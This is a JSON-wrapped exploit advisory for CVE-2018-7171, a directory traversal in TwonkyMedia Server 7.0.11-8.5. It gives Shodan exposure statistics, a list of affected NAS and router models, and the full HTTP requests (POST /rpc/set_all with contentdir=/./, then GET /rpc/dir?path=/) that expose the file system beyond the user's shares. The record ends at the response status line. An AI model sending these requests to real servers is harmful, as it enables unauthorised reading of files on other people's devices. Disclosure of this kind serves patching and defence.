{
    "text": "vul_name : TwonkyMedia Server 7.0.11-8.5 Directory Traversal ， vul_cve : CVE-2018-7171 ， vul_poc : ' ， 1. About ，  # Exploit Title : TwonkyMedia Server 7.0.11-8.5 Directory Traversal ，  # Date : 2018-03-27 ，  # Exploit Author : Sven Fassbender ，  # Contact :  ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : 7.0.11-8.5 ，  # CVE : CVE-2018-7171 ，  # Category : webapps ， 2. Background information ， \"With Twonky from Lynx Technology , you can quickly discover your media libraries of digital videos ,  ， photos and music in your home , control them from mobile devices , and enjoy them on connected screens and speakers. ， Twonky Server is the industry leading DLNA/UPnP Media Server from Lynx Technology that enables sharing media content ， between connected devices. Twonky Server is used worldwide and is available as a standalone server ，  ( end user installable , e.g. for PCs/Macs ) or an embedded server for devices such as NAS , routers/gateways and STBs. ， Twonky Servers web UI provides optimal capability for you to easily and reliably control and play back your ， media files in a variety of ways , and to beam those media files to other connected devices.\" -extract from ， Previous similar vulnerabilities :  ， Fix :  ， Statistics :  ， Around 20800 TwonkyMedia Servers public available listed on shodan.io worldwide. (  ， Rarely protected by password ( only around 2% ) . ， Top Countries :  ， 1. United States ， 2. Germany ， 3. Korea ， 4. Russian Federation ， 5. France ， 6. Italy ， 7. Taiwan ， 8. Poland ， 9. Hungary ， 10. United Kingdom ， TwonkyMedia Server seems too be pre installed on a huge range of NAS devices. For example the following NAS devices :  ， Thecus N2310 ， Thecus N4560 ， WDMyCloud ,  ， MyCloudEX2Ultra ,  ， WDMyCloudEX4 ,  ， WDMyCloudEX2100 ,  ， QNAP ,  ， Zyxel NAS326 ,  ， Zyxel NAS542 ,  ， Zyxel NSA310 ,  ， Zyxel NSA310S ,  ， Zyxel NSA320 ,  ， Zyxel NSA325-v2 ， . ， Other devices :  ， Belkin routers ， Zyxel EMG2926-Q10A ， . ， 3. Vulnerability description ， TwonkyMedia Server has a function which allows browsing parts of the file system , that are marked as shares by the user. ， By setting the \"contentdir\" parameter to \"/./\" with the rpc call \"set_all\" , an attacker can discover the filesystem outside of the user specified shares :  ， HTTP request :  ， POST /rpc/set_all HTTP/1.1 ， Host : 192.168.188.9 : 9000 ， User-Agent : Mozilla/5.0 ( Macintosh ; Intel Mac OS X 10.13 ; rv : 57.0 ) Gecko/20100101 Firefox/57.0 ， Accept :  * / *  ， Accept-Language : de , en-US ; q=0.7 , en ; q=0.3 ， Accept-Encoding : gzip , deflate ， Referer :  ， Content-Type : application/x-www-form-urlencoded ， X-Requested-With : XMLHttpRequest ， Content-Length : 228 ， Connection : close ， contentdir=/./ ， Now one can discover the file system with requests like the following :  ， HTTP request :  ， GET /rpc/dir?path=/ HTTP/1.1 ， Host : 192.168.188.9 : 9000 ， User-Agent : Mozilla/5.0 ( Macintosh ; Intel Mac OS X 10.13 ; rv : 57.0 ) Gecko/20100101 Firefox/57.0 ， Accept :  * / *  ， Accept-Language : de , en-US ; q=0.7 , en ; q=0.3 ， Accept-Encoding : gzip , deflate ， Referer :  ， X-Requested-With : XMLHttpRequest ， Connection : close ， HTTP response :  ， HTTP/1.1 200 OK",
    "time": "2018.03.29"
}